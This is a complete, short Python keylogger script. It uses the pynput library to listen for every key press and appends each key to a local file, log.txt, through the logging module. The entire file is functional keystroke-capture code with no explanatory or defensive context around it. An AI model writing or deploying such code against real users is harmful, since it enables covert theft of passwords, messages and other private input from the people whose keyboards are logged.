#! usr/bin/env python3

import os
import sys
import time
import pynput
import logging

class Keylogger:
    def __init__(self):
        self.log = logging.getLogger("Keylogger")
        self.log.setLevel(logging.DEBUG)
        self.handler = logging.FileHandler(filename="log.txt", encoding="utf-8", mode="a")
        self.log.addHandler(self.handler)

    def start(self):
        with pynput.keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
    
    def on_press(self, key):
        self.log.debug(str(key))

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()